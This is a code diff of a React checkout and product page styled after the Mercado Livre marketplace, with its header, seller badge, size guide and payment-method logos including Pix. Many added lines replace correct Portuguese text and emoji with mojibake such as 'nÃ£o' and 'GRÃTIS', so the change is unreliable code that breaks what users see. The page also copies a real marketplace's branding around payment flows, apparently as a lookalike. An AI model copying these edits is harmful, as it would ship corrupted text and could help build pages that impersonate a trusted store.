+      <p className="mt-1 text-[12px] text-[#667085]">Status da transaÃ§Ã£o: {status}</p>
       <div className="mt-6 border-t border-[#d8efdf] pt-5">
         <PaymentFooter />
       </div>
@@ -1491,17 +1485,11 @@ function PaymentFooter({ light = false }: { light?: boolean }) {
       <p>Telefone: +55 (11) 3368-5599</p>
       <p className="mt-3 text-[14px]">Formas de pagamento:</p>
       <div className="mt-2 flex flex-wrap items-center justify-center gap-2">
-        {["Aura", "Discover", "Master", "Diners", "Visa", "Amex"].map((name) => (
-          <span key={name} className={`inline-flex h-6 min-w-10 items-center justify-center rounded border px-2 text-[9px] font-bold ${boxClass}`}>
-            {name}
+        {[ { name: "American Express", src: payAmex }, { name: "Elo", src: payElo }, { name: "Visa", src: payVisa }, { name: "Mastercard", src: payMastercard }, { name: "Pix", src: payPix } ].map((method) => (
+          <span key={method.name} className={`inline-flex h-6 min-w-10 items-center justify-center rounded border px-2 ${boxClass}`}>
+            <img src={method.src} alt={method.name} className="h-4 w-auto" />
           </span>
         ))}
-        <span className={`inline-flex h-6 min-w-10 items-center justify-center rounded border px-2 ${boxClass}`}>
-          <img src={pixLogo} alt="Pix" className="h-4 w-4" />
-        </span>
-        <span className={`inline-flex h-6 min-w-10 items-center justify-center rounded border px-2 text-[9px] font-bold ${boxClass}`}>
-          Elo
-        </span>
       </div>
       <div className="mt-5 inline-flex items-center gap-2 text-[12px] font-semibold">
         <Lock className="h-4 w-4" />
@@ -1620,7 +1608,7 @@ function OrderSummary({
         </div>
         <div className="flex justify-between">
           <span>Frete</span>
-          <span className="text-[#00a650]">{shippingCents ? formatBRL(shippingCents) : "Grátis"}</span>
+          <span className="text-[#00a650]">{shippingCents ? formatBRL(shippingCents) : "GrÃ¡tis"}</span>
         </div>
         <div className="flex justify-between pt-1 text-[16px] font-semibold">
           <span>Total</span>
@@ -1730,10 +1718,10 @@ function MLHeader() {
           <div className="contents md:flex md:items-center md:gap-4">
             <div className="hidden items-center gap-2 rounded-full border border-[#3483fa] bg-white px-3 py-1 text-[12px] text-[#333] lg:flex">
               <span className="font-semibold text-[#3483fa]">ASSINE AGORA</span>
-              <span className="rounded-full bg-[#00c58f] px-1.5 text-[10px] font-bold text-white">GRÁTIS</span>
+              <span className="rounded-full bg-[#00c58f] px-1.5 text-[10px] font-bold text-white">GRÃTIS</span>
               <span className="font-semibold">MELI+</span>
               <span className="text-[10px] text-[#666]">
-                A PARTIR DE <b className="text-[#333]">R$ 9,90/MÊS</b>
+                A PARTIR DE <b className="text-[#333]">R$ 9,90/MÃŠS</b>
               </span>
             </div>
             <button className="justify-self-end text-[#333]">
@@ -1762,7 +1750,7 @@ function MLHeader() {
           <a href="#" className="hover:underline">Moda</a>
           <a href="#" className="relative hover:underline">
             Mercado Play
-            <span className="absolute -top-3 right-0 rounded-sm bg-[#00c58f] px-1 text-[9px] font-bold text-white">GRÁTIS</span>
+            <span className="absolute -top-3 right-0 rounded-sm bg-[#00c58f] px-1 text-[9px] font-bold text-white">GRÃTIS</span>
           </a>
           <a href="#" className="hover:underline">Vender</a>
           <a href="#" className="hover:underline">Contato</a>
@@ -1773,22 +1761,22 @@ function MLHeader() {
 }
 
 // ---------------- Related product cards ----------------
-function RelatedCard(p: (typeof RELATED)[number]) {
+function RelatedCard(p: RelatedProduct) {
   return (
     <div className="flex flex-col overflow-hidden rounded border border-[#eee] bg-white p-3">
       <div className="aspect-square overflow-hidden rounded">
         <img src={p.img} alt={p.title} loading="lazy" className="h-full w-full object-cover" />
       </div>
-      <p className="mt-3 line-clamp-2 text-[13px] text-[#333]">{p.title}</p>
-      {"compareCents" in p && p.compareCents && (
-        <div className="mt-2 text-[11px] text-[#999] line-through">{formatBRL(p.compareCents)}</div>
-      )}
-      <div className="mt-0.5 flex items-center gap-2">
-        <span className="text-[18px] text-[#333]">{formatBRL(p.priceCents)}</span>
-        {"discount" in p && p.discount && (
-          <span className="text-[12px] font-semibold text-[#00a650]">{p.discount}</span>
-        )}
+      <div className="mt-2 grid grid-cols-2 gap-1">
+        {p.gallery.slice(1).map((src) => (
+          <div key={src} className="aspect-square overflow-hidden rounded border border-[#eee]">
+            <img src={src} alt="" loading="lazy" className="h-full w-full object-cover" />
+          </div>
+        ))}
       </div>
+      <p className="mt-3 line-clamp-2 text-[13px] text-[#333]">{p.title}</p>
+      <p className="mt-1 line-clamp-3 text-[12px] leading-relaxed text-[#666]">{p.description}</p>
+      <div className="mt-2 text-[18px] text-[#333]">{formatBRL(p.priceCents)}</div>
       <div className="text-[12px] text-[#00a650]">{p.installments}</div>
       {p.freeShip && <div className="mt-1 text-[12px] font-semibold text-[#00a650]">Frete grátis</div>}
     </div>
@@ -1824,15 +1812,15 @@ function SizeGuideModal({ onClose }: { onClose: () => void }) {
             <div className="pb-2 text-[#bbb]">
               Do corpo
               <div className="mx-auto mt-1 w-fit rounded-full bg-[#eee] px-3 py-0.5 text-[10px] text-[#777]">
-                Guia não disponível
+                Guia nÃ£o disponÃ­vel
               </div>
             </div>
-            <div className="border-b-2 border-[#3483fa] pb-3 font-medium text-[#3483fa]">Da peça</div>
+            <div className="border-b-2 border-[#3483fa] pb-3 font-medium text-[#3483fa]">Da peÃ§a</div>
           </div>
 
-          <h3 className="text-[16px] font-semibold text-[#333]">Tabela de medidas para peças</h3>
+          <h3 className="text-[16px] font-semibold text-[#333]">Tabela de medidas para peÃ§as</h3>
           <p className="mt-2 text-[13px] text-[#777]">
-            As medidas estão em centímetros e podem variar conforme o modelo.
+            As medidas estÃ£o em centÃ­metros e podem variar conforme o modelo.
           </p>
 
           <div className="mt-4 overflow-hidden rounded-md border border-[#ddd]">
@@ -1840,9 +1828,9 @@ function SizeGuideModal({ onClose }: { onClose: () => void }) {
               <thead>
                 <tr className="bg-[#f5f5f5]">
                   <th className="bg-[#dce9fb] px-3 py-4 font-semibold">Tamanho na etiqueta</th>
-                  <th className="px-3 py-4 font-semibold">Equivalências</th>
+                  <th className="px-3 py-4 font-semibold">EquivalÃªncias</th>
                   <th className="px-3 py-4 font-semibold">Largura do peito</th>
-                  <th className="px-3 py-4 font-semibold">Altura da peça</th>
+                  <th className="px-3 py-4 font-semibold">Altura da peÃ§a</th>
                   <th className="px-3 py-4 font-semibold">Largura dos ombros</th>
                 </tr>
               </thead>
@@ -1861,10 +1849,10 @@ function SizeGuideModal({ onClose }: { onClose: () => void }) {
           </div>
 
           <div className="mt-7">
-            <h3 className="text-[16px] font-semibold text-[#333]">Como medir suas peças</h3>
+            <h3 className="text-[16px] font-semibold text-[#333]">Como medir suas peÃ§as</h3>
             <p className="mt-2 text-[13px] leading-relaxed text-[#777]">
-              Coloque a peça sobre uma superfície plana. Meça a largura do peito de axila a axila,
-              a altura da peça do ombro até a barra e a largura dos ombros de ponta a ponta.
+              Coloque a peÃ§a sobre uma superfÃ­cie plana. MeÃ§a a largura do peito de axila a axila,
+              a altura da peÃ§a do ombro atÃ© a barra e a largura dos ombros de ponta a ponta.
             </p>
           </div>
         </div>
@@ -1925,9 +1913,9 @@ function SellerCard() {
       </div>
       <div className="mt-3 flex items-center gap-2 text-[13px] text-[#00a650]">
         <img src={SELLER.medal} alt="" className="h-5 w-5" loading="lazy" />
-        MercadoLíder Platinum
+        MercadoLÃ­der Platinum
       </div>
-      <div className="mt-1 text-[12px] text-[#666]">É um dos melhores do site!</div>
+      <div className="mt-1 text-[12px] text-[#666]">Ã‰ um dos melhores do site!</div>
       <div className="mt-3 grid grid-cols-4 gap-1">
         <div className="h-1.5 rounded bg-[#f9d0d0]" />
         <div className="h-1.5 rounded bg-[#fce9c0]" />
@@ -1940,16 +1928,16 @@ function SellerCard() {
           Vendas
         </div>
         <div>
-          <div className="font-semibold text-[#333]">👍</div>
+          <div className="font-semibold text-[#333]">ðŸ‘</div>
           Bom atendimento
         </div>
         <div>
-          <div className="font-semibold text-[#333]">⏱</div>
+          <div className="font-semibold text-[#333]">â±</div>
           Entrega no prazo
         </div>
       </div>
       <button className="mt-4 w-full rounded-md bg-[#e6f0ff] py-2 text-[13px] font-semibold text-[#3483fa] hover:bg-[#d5e4fc]">
-        Ir para a página do vendedor
+        Ir para a pÃ¡gina do vendedor
       </button>
     </aside>
   );
@@ -1959,7 +1947,7 @@ function PaymentMethodsCard() {
   return (
     <aside className="rounded-md border border-[#e6e6e6] p-4">
       <div className="mb-3 text-[16px] font-semibold text-[#333]">Meios de pagamento</div>
-      <div className="text-[13px] text-[#333]">Cartões de crédito</div>
+      <div className="text-[13px] text-[#333]">CartÃµes de crÃ©dito</div>
       <div className="mt-2 flex flex-wrap items-center gap-2">
         {PAYMENT_METHODS.credit.map((method) => (
           <span key={method.name} className="inline-flex h-8 items-center justify-center rounded border border-[#eee] bg-white px-2">
@@ -1979,3 +1967,4 @@ function PaymentMethodsCard() {
     </aside>
   );
 }
+
